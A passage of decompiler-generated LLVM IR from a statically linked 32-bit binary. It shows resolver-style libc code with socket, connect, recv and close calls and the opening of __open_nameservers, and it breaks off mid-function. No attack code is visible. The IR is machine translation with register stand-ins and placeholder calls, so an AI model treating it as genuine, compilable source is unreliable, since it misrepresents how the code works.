dec_label_pc_804f474:                             ; preds = %dec_label_pc_804f1a6, %dec_label_pc_804f2d1, %dec_label_pc_804f2c9, %dec_label_pc_804f265, %dec_label_pc_804f1eb, %dec_label_pc_804f1c7, %dec_label_pc_804f467
  %v1_804f47b = phi i32 [ %v1_804f1bb, %dec_label_pc_804f1a6 ], [ %v1_804f2c2, %dec_label_pc_804f2d1 ], [ %v1_804f2c2, %dec_label_pc_804f2c9 ], [ %v1_804f1dc, %dec_label_pc_804f265 ], [ %v1_804f1dc, %dec_label_pc_804f1eb ], [ %v1_804f1dc, %dec_label_pc_804f1c7 ], [ %v1_804f471, %dec_label_pc_804f467 ]
  %v1_804f474 = add i32 %v1_804f47b, 51
  %v2_804f474 = inttoptr i32 %v1_804f474 to i8*
  %v3_804f474 = load i8, i8* %v2_804f474, align 1
  %v4_804f474 = icmp eq i8 %v3_804f474, 0
  %v1_804f479 = icmp eq i1 %v4_804f474, false
  br i1 %v1_804f479, label %dec_label_pc_804f4bf, label %dec_label_pc_804f47b

dec_label_pc_804f47b:                             ; preds = %dec_label_pc_804f474
  %v0_804f47b = load i32, i32* @ecx, align 4
  %v2_804f47b = add i32 %v1_804f47b, -4
  %v3_804f47b = inttoptr i32 %v2_804f47b to i32*
  store i32 %v0_804f47b, i32* %v3_804f47b, align 4
  %v1_804f47c = add i32 %v1_804f47b, -8
  %v2_804f47c = inttoptr i32 %v1_804f47c to i32*
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* %v2_804f47c, align 4
  %v1_804f481 = add i32 %v1_804f47b, -12
  %v2_804f481 = inttoptr i32 %v1_804f481 to i32*
  store i32 134535499, i32* %v2_804f481, align 4
  %v1_804f486 = add i32 %v1_804f47b, 184
  store i32 %v1_804f486, i32* @esi, align 4
  %v2_804f48d = add i32 %v1_804f47b, -16
  %v3_804f48d = inttoptr i32 %v2_804f48d to i32*
  store i32 %v1_804f486, i32* %v3_804f48d, align 4
  %v2_804f48e = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804f48e, i32* %eax.global-to-local, align 4
  %v0_804f493 = load i32, i32* @esp, align 4
  %v1_804f493 = inttoptr i32 %v0_804f493 to i32*
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* %v1_804f493, align 4
  %v1_804f49a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804f49a, i32* %eax.global-to-local, align 4
  %v0_804f49f = load i32, i32* @global_var_80561d8.401, align 8
  store i32 %v0_804f49f, i32* %ebx.global-to-local, align 4
  %v0_804f4a5 = load i32, i32* @esp, align 4
  %v1_804f4a5 = inttoptr i32 %v0_804f4a5 to i32*
  %v2_804f4a5 = load i32, i32* %v1_804f4a5, align 4
  store i32 %v2_804f4a5, i32* @eax, align 4
  %v3_804f4a5 = add i32 %v0_804f4a5, 4
  %v1_804f4a6 = inttoptr i32 %v3_804f4a5 to i32*
  %v2_804f4a6 = load i32, i32* %v1_804f4a6, align 4
  store i32 %v2_804f4a6, i32* %edx.global-to-local, align 4
  %v1_804f4a7 = add i32 %v0_804f49f, -1
  store i32 %v1_804f4a7, i32* @ebx, align 4
  store i32 1, i32* %v1_804f4a6, align 4
  %v0_804f4aa = load i32, i32* @esi, align 4
  store i32 %v0_804f4aa, i32* %v1_804f4a5, align 4
  %v2_804f4ab = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804f4ab, i32* %eax.global-to-local, align 4
  %v0_804f4b0 = load i32, i32* @esp, align 4
  %v1_804f4b0 = add i32 %v0_804f4b0, 16
  %v1_804f4b3 = add i32 %v0_804f4b0, 52
  %v2_804f4b3 = inttoptr i32 %v1_804f4b3 to i32*
  %v3_804f4b3 = load i32, i32* %v2_804f4b3, align 4
  %v4_804f4b3 = load i32, i32* @ebx, align 4
  %v5_804f4b3 = sub i32 %v3_804f4b3, %v4_804f4b3
  %v11_804f4b3 = xor i32 %v4_804f4b3, %v3_804f4b3
  %v12_804f4b3 = xor i32 %v5_804f4b3, %v3_804f4b3
  %v13_804f4b3 = and i32 %v12_804f4b3, %v11_804f4b3
  %v14_804f4b3 = icmp slt i32 %v13_804f4b3, 0
  %v16_804f4b3 = icmp slt i32 %v5_804f4b3, 0
  %v2_804f4b7 = icmp eq i1 %v16_804f4b3, %v14_804f4b3
  br i1 %v2_804f4b7, label %dec_label_pc_804f4bf, label %dec_label_pc_804f4b9

dec_label_pc_804f4b9:                             ; preds = %dec_label_pc_804f47b
  %v4_804f4b9 = add i32 %v3_804f4b3, 1
  store i32 %v4_804f4b9, i32* %v2_804f4b3, align 4
  br label %dec_label_pc_804f4e0.backedge

dec_label_pc_804f4bf:                             ; preds = %dec_label_pc_804f148, %dec_label_pc_804f47b, %dec_label_pc_804f474, %dec_label_pc_804f15f
  %v1_804f4ce = phi i32 [ %v1_804f4b0, %dec_label_pc_804f47b ], [ %v1_804f47b, %dec_label_pc_804f474 ], [ %v1_804f19b, %dec_label_pc_804f15f ], [ %v0_804f4bf.pre, %dec_label_pc_804f148 ]
  %v1_804f4bf = add i32 %v1_804f4ce, 40
  %v2_804f4bf = inttoptr i32 %v1_804f4bf to i32*
  %v3_804f4bf = load i32, i32* %v2_804f4bf, align 4
  %v1_804f4c3 = add i32 %v3_804f4bf, 1
  store i32 %v1_804f4c3, i32* %eax.global-to-local, align 4
  %v1_804f4c4 = ashr i32 %v1_804f4c3, 31
  store i32 %v1_804f4c4, i32* %edx.global-to-local, align 4
  %v1_804f4c5 = add i32 %v1_804f4ce, 248
  %v2_804f4c5 = inttoptr i32 %v1_804f4c5 to i32*
  %v3_804f4c5 = load i32, i32* %v2_804f4c5, align 4
  %v5_804f4c5 = zext i32 %v1_804f4c3 to i64
  %v7_804f4c5 = zext i32 %v1_804f4c4 to i64
  %v8_804f4c5 = mul nuw i64 %v7_804f4c5, 4294967296
  %v9_804f4c5 = or i64 %v8_804f4c5, %v5_804f4c5
  %v10_804f4c5 = zext i32 %v3_804f4c5 to i64
  %v11_804f4c5 = sdiv i64 %v9_804f4c5, %v10_804f4c5
  %v12_804f4c5 = trunc i64 %v11_804f4c5 to i32
  store i32 %v12_804f4c5, i32* %eax.global-to-local, align 4
  %v13_804f4c5 = srem i64 %v9_804f4c5, %v10_804f4c5
  %v14_804f4c5 = trunc i64 %v13_804f4c5 to i32
  store i32 %v14_804f4c5, i32* %edx.global-to-local, align 4
  %v1_804f4cc = icmp eq i32 %v14_804f4c5, 0
  store i32 %v14_804f4c5, i32* %v2_804f4bf, align 4
  %v1_804f4d2 = icmp eq i1 %v1_804f4cc, false
  br i1 %v1_804f4d2, label %dec_label_pc_804f4d8, label %dec_label_pc_804f4d4

dec_label_pc_804f4d4:                             ; preds = %dec_label_pc_804f4bf
  %v0_804f4d4 = load i32, i32* @esp, align 4
  %v1_804f4d4 = add i32 %v0_804f4d4, 28
  %v2_804f4d4 = inttoptr i32 %v1_804f4d4 to i32*
  %v3_804f4d4 = load i32, i32* %v2_804f4d4, align 4
  %v4_804f4d4 = add i32 %v3_804f4d4, 1
  store i32 %v4_804f4d4, i32* %v2_804f4d4, align 4
  br label %dec_label_pc_804f4d8

dec_label_pc_804f4d8:                             ; preds = %dec_label_pc_804f4bf, %dec_label_pc_804f4d4
  %v0_804f4d8 = load i32, i32* @esp, align 4
  %v1_804f4d8 = add i32 %v0_804f4d8, 36
  %v2_804f4d8 = inttoptr i32 %v1_804f4d8 to i32*
  store i32 -1, i32* %v2_804f4d8, align 4
  br label %dec_label_pc_804f4e0.backedge

dec_label_pc_804f4e0.backedge:                    ; preds = %dec_label_pc_804f4d8, %dec_label_pc_804f156, %dec_label_pc_804f244, %dec_label_pc_804f4b9
  %v0_804f4e0.pre = load i32, i32* @esp, align 4
  %v1_804f4e0 = add i32 %v0_804f4e0.pre, 28
  %v2_804f4e0 = inttoptr i32 %v1_804f4e0 to i32*
  %v3_804f4e0 = load i32, i32* %v2_804f4e0, align 4
  %tmp111 = icmp ult i32 %v3_804f4e0, 3
  br i1 %tmp111, label %dec_label_pc_804ef40, label %dec_label_pc_804f505

dec_label_pc_804f505:                             ; preds = %dec_label_pc_804eeba, %dec_label_pc_804ef56, %dec_label_pc_804f04a, %dec_label_pc_804f4e0.backedge, %entry, %dec_label_pc_804ee94, %dec_label_pc_804ee9c, %dec_label_pc_804eeaa
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_804eeaa ], [ -1, %dec_label_pc_804ee9c ], [ -1, %dec_label_pc_804ee94 ], [ -1, %entry ], [ %v0_804ef07, %dec_label_pc_804f4e0.backedge ], [ %v0_804ef07, %dec_label_pc_804f04a ], [ %v0_804ef07, %dec_label_pc_804ef56 ], [ %v0_804ef07, %dec_label_pc_804eeba ]
  %v0_804f505 = call i32 @__GI___h_errno_location()
  store i32 %v0_804f505, i32* %eax.global-to-local, align 4
  %v1_804f50a = inttoptr i32 %v0_804f505 to i32*
  store i32 -1, i32* %v1_804f50a, align 4
  %v0_804f510 = load i32, i32* @esp, align 4
  %v1_804f510 = add i32 %v0_804f510, 56
  %v2_804f510 = inttoptr i32 %v1_804f510 to i32*
  %v3_804f510 = load i32, i32* %v2_804f510, align 4
  store i32 %v3_804f510, i32* %eax.global-to-local, align 4
  %v2_804f514 = add i32 %v0_804f510, 44
  %v3_804f514 = inttoptr i32 %v2_804f514 to i32*
  store i32 %v3_804f510, i32* %v3_804f514, align 4
  br label %dec_label_pc_804f518

dec_label_pc_804f518:                             ; preds = %dec_label_pc_804f27d, %dec_label_pc_804f255, %dec_label_pc_804f505
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_804f505 ], [ %v0_804ef07, %dec_label_pc_804f27d ], [ %v0_804ef07, %dec_label_pc_804f255 ]
  %v0_804f518 = load i32, i32* @esp, align 4
  %v1_804f518 = add i32 %v0_804f518, 20
  %v2_804f518 = inttoptr i32 %v1_804f518 to i32*
  %v3_804f518 = load i32, i32* %v2_804f518, align 4
  %v13_804f518 = icmp eq i32 %v3_804f518, -1
  br i1 %v13_804f518, label %dec_label_pc_804f518.dec_label_pc_804f52e_crit_edge, label %dec_label_pc_804f51f

dec_label_pc_804f518.dec_label_pc_804f52e_crit_edge: ; preds = %dec_label_pc_804f518
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_804f52e

dec_label_pc_804f51f:                             ; preds = %dec_label_pc_804f518
  %v3_804f522 = load i32, i32* %v2_804f518, align 4
  %v5_804f522 = add i32 %v0_804f518, -16
  %v6_804f522 = inttoptr i32 %v5_804f522 to i32*
  store i32 %v3_804f522, i32* %v6_804f522, align 4
  %v1_804f526 = sext i16 %stack_var_-180.1 to i32
  %v2_804f526 = call i32 @__libc_close(i32 %v1_804f526)
  store i32 %v2_804f526, i32* %eax.global-to-local, align 4
  %v0_804f52b = load i32, i32* @esp, align 4
  %v1_804f52b = add i32 %v0_804f52b, 16
  br label %dec_label_pc_804f52e

dec_label_pc_804f52e:                             ; preds = %dec_label_pc_804f518.dec_label_pc_804f52e_crit_edge, %dec_label_pc_804f51f
  %v1_804f535.pre-phi = phi i32 [ %.pre, %dec_label_pc_804f518.dec_label_pc_804f52e_crit_edge ], [ %v1_804f526, %dec_label_pc_804f51f ]
  %v0_804f52e = phi i32 [ %v0_804f518, %dec_label_pc_804f518.dec_label_pc_804f52e_crit_edge ], [ %v1_804f52b, %dec_label_pc_804f51f ]
  %v1_804f531 = add i32 %v0_804f52e, 12
  %v2_804f531 = inttoptr i32 %v1_804f531 to i32*
  %v3_804f531 = load i32, i32* %v2_804f531, align 4
  %v5_804f531 = add i32 %v0_804f52e, -16
  %v6_804f531 = inttoptr i32 %v5_804f531 to i32*
  store i32 %v3_804f531, i32* %v6_804f531, align 4
  %v2_804f535 = call i32 @free(i32 %v1_804f535.pre-phi)
  store i32 %v2_804f535, i32* %eax.global-to-local, align 4
  %v1_804f53a = load i32, i32* @esp, align 4
  %v2_804f53a = inttoptr i32 %v1_804f53a to i32*
  store i32 %v2_804ee72, i32* %v2_804f53a, align 4
  %v2_804f53d = call i32 @free(i32 %v1_804f535.pre-phi)
  store i32 %v2_804f53d, i32* @eax, align 4
  %v0_804f542 = load i32, i32* @esp, align 4
  %v1_804f545 = add i32 %v0_804f542, 56
  %v2_804f545 = inttoptr i32 %v1_804f545 to i32*
  %v3_804f545 = load i32, i32* %v2_804f545, align 4
  %v13_804f545 = icmp eq i32 %v3_804f545, -1
  %v1_804f54a = add i32 %v0_804f542, 32
  %v2_804f54a = inttoptr i32 %v1_804f54a to i32*
  store i32 -1, i32* %v2_804f54a, align 4
  br i1 %v13_804f545, label %dec_label_pc_804f52e.dec_label_pc_804f5a1_crit_edge, label %dec_label_pc_804f554

dec_label_pc_804f52e.dec_label_pc_804f5a1_crit_edge: ; preds = %dec_label_pc_804f52e
  %v0_804f5a1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f5a1

dec_label_pc_804f554:                             ; preds = %dec_label_pc_804f52e
  %v0_804f554 = load i32, i32* @ecx, align 4
  %v1_804f554 = load i32, i32* @esp, align 4
  %v2_804f554 = add i32 %v1_804f554, -4
  %v3_804f554 = inttoptr i32 %v2_804f554 to i32*
  store i32 %v0_804f554, i32* %v3_804f554, align 4
  %v1_804f555 = add i32 %v1_804f554, -8
  %v2_804f555 = inttoptr i32 %v1_804f555 to i32*
  store i32 ptrtoint (i8** @global_var_8055de8.398 to i32), i32* %v2_804f555, align 4
  %v1_804f55a = add i32 %v1_804f554, -12
  %v2_804f55a = inttoptr i32 %v1_804f55a to i32*
  store i32 134535499, i32* %v2_804f55a, align 4
  %v1_804f55f = add i32 %v1_804f554, 184
  store i32 %v1_804f55f, i32* %ebx.global-to-local, align 4
  %v2_804f566 = add i32 %v1_804f554, -16
  %v3_804f566 = inttoptr i32 %v2_804f566 to i32*
  store i32 %v1_804f55f, i32* %v3_804f566, align 4
  %v3_804f567 = call i32 @__pthread_return_void(i32 %v1_804f535.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f567, i32* %eax.global-to-local, align 4
  %v0_804f56c = load i32, i32* @esp, align 4
  %v1_804f56c = inttoptr i32 %v0_804f56c to i32*
  store i32 ptrtoint (i8** @global_var_8055de8.398 to i32), i32* %v1_804f56c, align 4
  %v2_804f573 = call i32 @__pthread_return_0(i32 %v1_804f535.pre-phi)
  store i32 %v2_804f573, i32* %eax.global-to-local, align 4
  %v0_804f578 = load i32, i32* @esp, align 4
  %v1_804f578 = add i32 %v0_804f578, 60
  %v2_804f578 = inttoptr i32 %v1_804f578 to i32*
  %v3_804f578 = load i32, i32* %v2_804f578, align 4
  store i32 %v3_804f578, i32* %eax.global-to-local, align 4
  %v1_804f57c = add i32 %v0_804f578, 56
  %v2_804f57c = inttoptr i32 %v1_804f57c to i32*
  %v3_804f57c = load i32, i32* %v2_804f57c, align 4
  store i32 %v3_804f57c, i32* %edx.global-to-local, align 4
  %v1_804f580 = trunc i32 %v3_804f578 to i16
  store i16 %v1_804f580, i16* @global_var_805372c.400, align 4
  %v1_804f586 = inttoptr i32 %v0_804f578 to i32*
  %v2_804f586 = load i32, i32* %v1_804f586, align 4
  store i32 %v2_804f586, i32* @eax, align 4
  %v3_804f586 = add i32 %v0_804f578, 4
  %v1_804f587 = sext i32 %v3_804f57c to i64
  store i64 %v1_804f587, i64* @global_var_8055e00.399, align 512
  %v1_804f58d = inttoptr i32 %v3_804f586 to i32*
  %v2_804f58d = load i32, i32* %v1_804f58d, align 4
  store i32 %v2_804f58d, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804f58d, align 4
  %v0_804f590 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f590, i32* %v1_804f586, align 4
  %v3_804f591 = call i32 @__pthread_return_void(i32 %v1_804f535.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f591, i32* %eax.global-to-local, align 4
  %v0_804f596 = load i32, i32* @esp, align 4
  %v1_804f596 = add i32 %v0_804f596, 32
  %v2_804f596 = inttoptr i32 %v1_804f596 to i32*
  store i32 -1, i32* %v2_804f596, align 4
  br label %dec_label_pc_804f59e

dec_label_pc_804f59e:                             ; preds = %dec_label_pc_804f412, %dec_label_pc_804f554
  %v0_804f59e = load i32, i32* @esp, align 4
  %v1_804f59e = add i32 %v0_804f59e, 16
  br label %dec_label_pc_804f5a1

dec_label_pc_804f5a1:                             ; preds = %dec_label_pc_804f52e.dec_label_pc_804f5a1_crit_edge, %dec_label_pc_804f59e
  %v0_804f5a1 = phi i32 [ %v0_804f5a1.pre, %dec_label_pc_804f52e.dec_label_pc_804f5a1_crit_edge ], [ %v1_804f59e, %dec_label_pc_804f59e ]
  %v1_804f5a1 = add i32 %v0_804f5a1, 16
  %v2_804f5a1 = inttoptr i32 %v1_804f5a1 to i32*
  %v3_804f5a1 = load i32, i32* %v2_804f5a1, align 4
  store i32 %v3_804f5a1, i32* %eax.global-to-local, align 4
  %v1_804f5a5 = add i32 %v0_804f5a1, 220
  %v1_804f5ab = inttoptr i32 %v1_804f5a5 to i32*
  %v2_804f5ab = load i32, i32* %v1_804f5ab, align 4
  store i32 %v2_804f5ab, i32* @ebx, align 4
  %v3_804f5ab = add i32 %v0_804f5a1, 224
  %v1_804f5ac = inttoptr i32 %v3_804f5ab to i32*
  %v2_804f5ac = load i32, i32* %v1_804f5ac, align 4
  store i32 %v2_804f5ac, i32* @esi, align 4
  %v3_804f5ac = add i32 %v0_804f5a1, 228
  %v1_804f5ad = inttoptr i32 %v3_804f5ac to i32*
  %v2_804f5ad = load i32, i32* %v1_804f5ad, align 4
  store i32 %v2_804f5ad, i32* @edi, align 4
  %v3_804f5ad = add i32 %v0_804f5a1, 232
  %v1_804f5ae = inttoptr i32 %v3_804f5ad to i32*
  %v2_804f5ae = load i32, i32* %v1_804f5ae, align 4
  store i32 %v2_804f5ae, i32* @ebp, align 4
  ret i32 %v3_804f5a1

; uselistorder directives
  uselistorder i32 %v0_804f5a1, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804f578, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f52e, { 1, 0 }
  uselistorder i32 %v1_804f535.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_804f4e0.pre, { 1, 0 }
  uselistorder i32 %v5_804f4b3, { 1, 0 }
  uselistorder i32 %v3_804f4b3, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804f47b, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804f444, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f412, { 1, 0 }
  uselistorder i32 %v3_804f3f1, { 1, 0, 2 }
  uselistorder i32 %v0_804f3e2, { 1, 0 }
  uselistorder i32 %v5_804f3d8, { 1, 0 }
  uselistorder i32* %v3_804f3d8, { 1, 0 }
  uselistorder i32 %v0_804f2ae68, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_804f3d8, { 2, 1, 0 }
  uselistorder i32 %v5_804f3d2, { 1, 0 }
  uselistorder i32 %v1_804f3d1, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f3cd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f391, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_804f36b, { 1, 0 }
  uselistorder i32 %v1_804f35c, { 1, 0 }
  uselistorder i32 %v3_804f32d, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804f31b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804f2c2, { 1, 2, 0 }
  uselistorder i32 %v0_804f2c2, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_804f29c, { 1, 0 }
  uselistorder i32 %v0_804f2a4, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804f292, { 1, 0, 2 }
  uselistorder i32 %v5_804f23e, { 1, 0 }
  uselistorder i32* %v2_804f23e, { 1, 0, 2 }
  uselistorder i32 %v3_804f1f6, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804f1dc, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_804f1bb, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804f19b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804f141, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_804f126, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_804f10f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804f097, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804f04a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804f02b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804f00f, { 1, 0 }
  uselistorder i32 %v3_804f004, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_804f001, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_804efa6, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_804efa1, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ef8a, { 1, 0 }
  uselistorder i32 %v1_804ef56, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ef4784, { 2, 1, 0 }
  uselistorder i16 %v0_804ef07, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_804ef00, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_804ee72, { 1, 6, 4, 9, 10, 2, 3, 8, 0, 5, 11, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 68, { 2, 1, 3, 4, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 100, { 0, 4, 2, 3, 1 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 2, 1 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 4, 3, 2, 1 }
  uselistorder i32 17, { 13, 12, 5, 11, 2, 3, 1, 6, 7, 8, 9, 0, 15, 4, 14, 10 }
  uselistorder i32 176, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 2, 3, 4, 0, 1 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 0, 2, 3, 1 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i32 84, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 27, 13, 24, 25, 26, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 28, 21, 24, 22, 25, 26, 27, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @__libc_close, { 2, 1, 0, 3, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805372c.400, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0 }
  uselistorder i64* @global_var_8055e00.399, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8055de8.398 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8055de8.398, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f5a1, { 1, 0 }
  uselistorder label %dec_label_pc_804f59e, { 1, 0 }
  uselistorder label %dec_label_pc_804f52e, { 1, 0 }
  uselistorder label %dec_label_pc_804f518, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f505, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804f4e0.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f4d8, { 1, 0 }
  uselistorder label %dec_label_pc_804f4bf, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804f474, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804f412, { 1, 0 }
  uselistorder label %dec_label_pc_804f3e2, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_804f3d8, { 1, 0 }
  uselistorder label %dec_label_pc_804f3cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f3ca, { 1, 0 }
  uselistorder label %dec_label_pc_804f345, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f29c, { 1, 0 }
  uselistorder label %dec_label_pc_804f10f, { 1, 0 }
  uselistorder label %dec_label_pc_804f0d8, { 1, 0 }
  uselistorder label %dec_label_pc_804f04a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef56, { 1, 0 }
  uselistorder label %dec_label_pc_804ef40, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_804f5b0 = load i32, i32* @ebp, align 4
  store i32 134535499, i32* %stack_var_-216, align 4
  %v3_804f5bf = ptrtoint i32* %stack_var_-216 to i32
  %v2_804f5c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f5c4, i32* @eax, align 4
  %v2_804f5cc = call i32 @__pthread_return_void(i32 %v2_804f5c4, i32 134535499)
  %v1_804f5d8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053730.338 to i32))
  store i32 %v1_804f5d8, i32* @eax, align 4
  %v0_804f5e0 = load i32, i32* @global_var_80561d4.339, align 4
  %tmp41 = icmp slt i32 %v0_804f5e0, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_804f7d7, label %dec_label_pc_804f5ed

dec_label_pc_804f5ed:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8052db0.403 to i32), i32* %stack_var_-216, align 4
  %v2_804f5f9 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_8052d7e.404 to i32), i32 ptrtoint (i32* @global_var_8052db0.403 to i32))
  store i32 %v2_804f5f9, i32* @eax, align 4
  %v1_804f601 = icmp eq i32 %v2_804f5f9, 0
  store i32 %v2_804f5f9, i32* @ebp, align 4
  %v1_804f605 = icmp eq i1 %v1_804f601, false
  br i1 %v1_804f605, label %dec_label_pc_804f7a2.preheader, label %dec_label_pc_804f60b

dec_label_pc_804f60b:                             ; preds = %dec_label_pc_804f5ed
  store i32 ptrtoint (i32* @global_var_8052db0.403 to i32), i32* %stack_var_-216, align 4
  %v2_804f617 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_8052d8f.405 to i32), i32 ptrtoint (i32* @global_var_8052db0.403 to i32))
  %v1_804f61f = icmp eq i32 %v2_804f617, 0
  store i32 %v2_804f617, i32* @ebp, align 4
  %v1_804f623 = icmp eq i1 %v1_804f61f, false
  br i1 %v1_804f623, label %dec_label_pc_804f7a2.preheader, label %dec_label_pc_804f7cc

dec_label_pc_804f7a2.preheader:                   ; preds = %dec_label_pc_804f5ed, %dec_label_pc_804f60b
  %v2_804f7a9 = ptrtoint i32* %stack_var_-180 to i32
  %v3_804f6dd = add i32 %v3_804f5bf, 164
  %v4_804f6cc = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_804f7a2

dec_label_pc_804f62e:                             ; preds = %dec_label_pc_804f639
  %v1_804f62e = add i32 %v0_804f62e56, 1
  store i32 %v1_804f62e, i32* @ebx, align 4
  %v1_804f62f = inttoptr i32 %v1_804f62e to i8*
  %v2_804f62f = load i8, i8* %v1_804f62f, align 1
  %v3_804f62f = zext i8 %v2_804f62f to i32
  %v5_804f62f = and i32 %v6_804f62f59, -256
  %v6_804f62f = or i32 %v3_804f62f, %v5_804f62f
  store i32 %v6_804f62f, i32* @ecx, align 4
  %v4_804f631 = icmp eq i8 %v2_804f62f, 0
  br i1 %v4_804f631, label %dec_label_pc_804f7a2, label %dec_label_pc_804f639

dec_label_pc_804f639:                             ; preds = %dec_label_pc_804f639.lr.ph, %dec_label_pc_804f62e
